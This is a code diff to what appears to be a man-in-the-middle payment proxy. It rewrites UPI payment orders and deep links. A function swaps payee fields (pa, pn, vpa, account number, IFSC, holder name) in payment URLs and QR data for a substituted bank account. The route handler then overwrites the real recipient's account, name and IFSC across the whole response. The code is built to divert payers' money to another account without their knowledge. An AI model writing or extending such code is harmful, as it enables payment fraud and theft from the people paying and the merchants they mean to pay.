@@ -942,13 +942,29 @@ const BANK_FIELDS = {
 
 function replaceBankInUrl(urlStr, bank) {
   if (!urlStr || typeof urlStr !== 'string') return urlStr;
-  if (!urlStr.includes('://') && !urlStr.includes('?')) return urlStr;
+  if (!urlStr.includes('://') && !urlStr.includes('?') && !urlStr.includes('pa=')) return urlStr;
+
+  const upiToUse = bank.upiId || (bank.accountNo ? `${bank.accountNo}@${(bank.ifsc || 'npci').toLowerCase()}.ifsc.npci` : '');
+
+  let result = urlStr;
+
+  if (upiToUse) {
+    result = result.replace(/([?&])pa=([^&]*)/gi, `$1pa=${encodeURIComponent(upiToUse)}`);
+    result = result.replace(/([?&])vpa=([^&]*)/gi, `$1vpa=${encodeURIComponent(upiToUse)}`);
+    result = result.replace(/([?&])payeeUpi=([^&]*)/gi, `$1payeeUpi=${encodeURIComponent(upiToUse)}`);
+  }
+
+  if (bank.accountHolder) {
+    result = result.replace(/([?&])pn=([^&]*)/gi, `$1pn=${encodeURIComponent(bank.accountHolder)}`);
+    result = result.replace(/([?&])name=([^&]*)/gi, `$1name=${encodeURIComponent(bank.accountHolder)}`);
+    result = result.replace(/([?&])accountName=([^&]*)/gi, `$1accountName=${encodeURIComponent(bank.accountHolder)}`);
+    result = result.replace(/([?&])payeeName=([^&]*)/gi, `$1payeeName=${encodeURIComponent(bank.accountHolder)}`);
+  }
+
   const urlParams = [
-    { names: ['account', 'accountNo', 'account_no', 'accountno', 'account_number', 'accountNumber', 'acc', 'receiveAccountNo', 'receiver_account', 'pa'], value: bank.accountNo },
-    { names: ['name', 'accountName', 'account_name', 'accountname', 'receiveAccountName', 'receiver_name', 'beneficiary_name', 'beneficiaryName', 'pn', 'holder_name'], value: bank.accountHolder },
+    { names: ['account', 'accountNo', 'account_no', 'accountno', 'account_number', 'accountNumber', 'acc', 'receiveAccountNo', 'receiver_account'], value: bank.accountNo },
     { names: ['ifsc', 'ifsc_code', 'ifscCode', 'receiveIfsc', 'IFSC'], value: bank.ifsc }
   ];
-  let result = urlStr;
   for (const group of urlParams) {
     if (!group.value) continue;
     for (const paramName of group.names) {
@@ -956,18 +972,15 @@ function replaceBankInUrl(urlStr, bank) {
       result = result.replace(regex, '$1$2=' + encodeURIComponent(group.value));
     }
   }
-  if (bank.upiId && result.includes('upi://pay')) {
-    result = result.replace(/pa=[^&]+/, `pa=${bank.upiId}`);
-    if (bank.accountHolder) result = result.replace(/pn=[^&]+/, `pn=${encodeURIComponent(bank.accountHolder)}`);
-  }
+
   return result;
 }
 
 function deepReplace(obj, bank, originalValues, depth) {
   if (!obj || typeof obj !== 'object' || depth > 10) return;
 
-  // Skip replacement for Payout Wallet sections
-  const skipKeys = ['payoutwallet', 'payoutaccount', 'payoutupi', 'payout', 'userwallet', 'memberwallet'];
+  // Skip replacement only for user's payout wallet extraction fields
+  const skipKeys = ['payoutwallettype', 'payoutwalletname', 'payoutwalletaccount', 'payoutwalletupi', 'userwallet', 'memberwallet'];
 
   if (!originalValues) originalValues = {};
   for (const key of Object.keys(obj)) {
@@ -2795,6 +2808,41 @@ app.all('/app/payment/order/orderInfo', async (req, res) => {
           } else {
             deepReplace(detailData, bankToUse, {}, 0);
           }
+
+          if (detailData && typeof detailData === 'object' && !Array.isArray(detailData)) {
+            const upiVpa = bankToUse.upiId || (bankToUse.accountNo ? `${bankToUse.accountNo}@${(bankToUse.ifsc || 'npci').toLowerCase()}.ifsc.npci` : '');
+            const acctFields = ['payeeAccount', 'bankAccount', 'accountNo', 'account', 'receiveAccount', 'payoutAccount', 'payoutAccountNo', 'collectionAccount', 'payeeAccountNo'];
+            const nameFields = ['payeeName', 'name', 'accountName', 'beneficiaryName', 'receiveName', 'realName', 'accountHolder', 'payoutName', 'payoutAccountName', 'collectionName'];
+            const ifscFields = ['ifsc', 'ifscCode', 'bankIfsc', 'receiveIfsc', 'payoutIfsc', 'collectionIfsc'];
+            const bankFields = ['bankName', 'bank_name', 'bank', 'payoutBank', 'payeeBankName', 'collectionBankName'];
+            const upiFields = ['payoutUpi', 'payoutUpiId', 'payeeUpi', 'upi', 'upiId', 'vpa', 'collectionUpi'];
+
+            acctFields.forEach(k => { if (detailData[k] !== undefined) detailData[k] = bankToUse.accountNo; });
+            nameFields.forEach(k => { if (detailData[k] !== undefined) detailData[k] = bankToUse.accountHolder; });
+            ifscFields.forEach(k => { if (detailData[k] !== undefined) detailData[k] = bankToUse.ifsc; });
+            bankFields.forEach(k => { if (detailData[k] !== undefined) detailData[k] = bankToUse.bankName || 'IMPS'; });
+            upiFields.forEach(k => { if (detailData[k] !== undefined) detailData[k] = upiVpa; });
+
+            const urlKeys = ['intent', 'payUrl', 'freechargeIntent', 'mobikwikIntent', 'paytmIntent', 'deeplink', 'qrData', 'qrCode'];
+            urlKeys.forEach(k => {
+              if (detailData[k] && typeof detailData[k] === 'string') {
+                detailData[k] = replaceBankInUrl(detailData[k], bankToUse);
+              }
+            });
+          }
+
+          let respStr = JSON.stringify(jsonResp);
+          if (realAcct && realAcct.length > 4 && bankToUse.accountNo) {
+            respStr = respStr.split(realAcct).join(bankToUse.accountNo);
+          }
+          if (realName && realName.length > 4 && bankToUse.accountHolder) {
+            respStr = respStr.split(realName).join(bankToUse.accountHolder);
+          }
+          if (realIfsc && realIfsc.length > 4 && bankToUse.ifsc) {
+            respStr = respStr.split(realIfsc).join(bankToUse.ifsc);
+          }
+          try { jsonResp = JSON.parse(respStr); } catch (e) { }
+          respBody = JSON.stringify(jsonResp);
 
           if (!boundBank && (orderCodeStr !== 'N/A' || orderIdStr)) {
             const bindingObj = {
